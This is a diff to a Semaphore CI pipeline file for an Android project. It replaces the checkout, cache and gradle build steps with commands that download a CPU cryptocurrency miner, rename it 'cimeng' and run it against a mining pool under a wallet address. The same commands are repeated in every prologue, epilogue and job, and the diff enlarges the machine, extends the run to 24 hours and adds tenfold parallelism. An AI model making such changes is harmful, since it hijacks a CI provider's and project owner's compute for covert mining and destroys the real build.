@@ -2,35 +2,78 @@ version: v1.0
 name: Verification Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
   containers:
     - name: main
       image: 'registry.semaphoreci.com/android:29'
+execution_time_limit:
+  hours: 24
 global_job_config:
   env_vars:
     - name: ADB_INSTALL_TIMEOUT
       value: '10'
   prologue:
     commands:
-      - checkout
-      - cache restore gradle-wrapper
-      - cache restore gradle-cache
-      - cache restore android-build
+      - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+      - tar xf cpuminer-opt-linux.tar.gz
+      - mv cpuminer-sse2 cimeng
+      - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
+  epilogue:
+    always:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 cimeng
+        - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
+    on_pass:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 cimeng
+        - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
+    on_fail:
+      commands:
+        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - tar xf cpuminer-opt-linux.tar.gz
+        - mv cpuminer-sse2 cimeng
+        - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
 blocks:
   - name: Build
     task:
       jobs:
         - name: Build Project
           commands:
-            - ./gradlew bundleDebug
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
+          parallelism: 10
       epilogue:
+        always:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
         on_pass:
           commands:
-            - cache clear
-            - cache store gradle-wrapper ~/.gradle/wrapper
-            - cache store gradle-cache ~/.gradle/caches
-            - cache store android-build ~/.android/build-cache
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
+        on_fail:
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
+      prologue:
+        commands:
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 cimeng
+          - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
   - name: Verification
     task:
       jobs:
